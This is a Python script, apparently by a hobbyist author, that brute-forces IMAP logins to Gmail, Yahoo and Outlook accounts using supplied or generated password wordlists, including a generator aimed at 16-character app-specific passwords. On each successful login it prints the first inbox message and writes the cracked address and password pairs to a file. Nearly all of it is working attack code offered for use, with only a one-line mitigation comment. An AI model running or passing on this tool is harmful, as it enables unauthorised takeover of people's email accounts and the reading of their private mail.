#! python3
# imapBruteForce.py - Author: David Sullivan
# version 1.1 - Updated 12/3/2016
#
# Changelog:
#   -v1.1- Allows for importing/saving of files, fixed minor issues with bruteforce generators
#
# This tool can be used to brute force and log in to gmail.com, yahoo.com and outlook.com
# email addresses. This does not cause account lockout
# 
# If an application specific password has been set on an account that uses 2 factor authentication,
# this tool can also be used to brute force the application specific password.
# (A function has been created with the ruleset to build a wordlist for this using the 16 character,
#   all lowercase rules used for application specific passwords. This is not ideal and it is recommended
#   that you do this outside of python/use a birthday attack wordlist for this.)
#
# Notes/Requirements for Account:
#   -Gmail: imap.gmail.com
#       -IMAP enabled
#       -Allow apps that use less secure log-in (only if 2-factor is disabled)
#   -Yahoo: imap.mail.yahoo.com
#       -Allow apps that use less secure log-in (only if 2-factor is disabled)
#   -Outlook: imap.outlook.com
#       -No special requirements
#
# Mitaging steps: Implement account lockout/logging on imap logins
#
#
# To do:
#   -Support command line arguments
#   -Rewrite to not need imapclient library
#   -Breakout creation of wordlist to a seperate script
#   -Allow for threading of login attempts to speed up process
#   -Add option to download and save entire mailbox to a file



import imapclient, backports, itertools

#Variables
addressList = [] #put the target addresses here in list format e.g ['test1@test.com','test2@test.com']
wordlist = [] #put your wordlist/dictionary here in list format e.g ['test1','test2']
imapServer = [] #put one target server here in list format e.g ['imap.test.com']
outfile = () #where you want to save successful logons e.g (r'c:\successful.txt')

#If you want to use files for your addresses and wordlist put them here
addressFile = (r'') # put the source file for your address here e.g (r'c:\addresses.txt')
wordlistFile = (r'') # put the source wordlist file here e.g (r'c:\wordlist.txt')

# Application specific password wordlist generator (for 16 character lowercase brute forcing- not recommended!)
def create_wordlist():
    global wordlist
    broken_list = []
    alphabet = 'abcdefghijklmnopqrstuvwxyz'
    min_length = 16
    max_length = 16
    for n in range(min_length,max_length+1):
        for word in itertools.product(alphabet, repeat=n):
            broken_list.append(word)

    for x in broken_list:
        word = ''
        for y in range(len(x)):
            word += ''.join(x[y])
        wordlist.append(word)
    return wordlist

# Bruteforce wordlist generator (don't really recommend using this as it is extremely time consuming)
def create_brute_wordlist():
    global wordlist
    broken_list = []
    # Put potential characters here (don't duplicate)
    characters = 'abcdefghijklmnopqrstuvwxyzlABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    min_length = 1
    max_length = 2
    for n in range(min_length,max_length+1):
        for word in itertools.product(characters, repeat=n):
            broken_list.append(word)

    for x in broken_list:
        word = ''
        for y in range(len(x)):
            word += ''.join(x[y])
        wordlist.append(word)
    return wordlist
    
def imapAttack(emails,wl,imapServerName):
    successful = []
    for email in emails:
        for password in wl:
            try:
                print('Trying %s' % password)
                context = backports.ssl.SSLContext(backports.ssl.PROTOCOL_TLSv1_2)
                server = imapclient.IMAPClient(imapServerName[0], ssl=True, ssl_context=context)
                server.login(email, password)
                print('Success! %s' % password)
                successful.append((email,password))
                server.select_folder('INBOX')
                UIDs = server.search()
                message = server.fetch(UIDs[0], ['BODY[]'])
                print(message)
                break
            except Exception:
                continue
    writeSuccess = open(outfile, 'w')
    for pair in range(len(successful)):
        successful[pair] = '%s: %s' % (successful[pair][0],successful[pair][1])
    writeSuccess.write('\n'.join(successful))
    writeSuccess.close()

def addressImport():
    global addressList
    with open(addressFile) as file:
        addressList = file.read().splitlines()
    return addressList

def wordlistImport():
    global wordlist
    with open(wordlistFile) as file:
        wordlist = file.read().splitlines()
    return wordlist

# Remove comments next to commands below to generate wordlists (not recommended-demo purposes only!)
#create_wordlist()
#create_brute_wordlist()

# Remove comments below to load your files into the addressList and wordlist variables
#addressImport()
#wordlistImport()    

imapAttack(addressList,wordlist,imapServer)

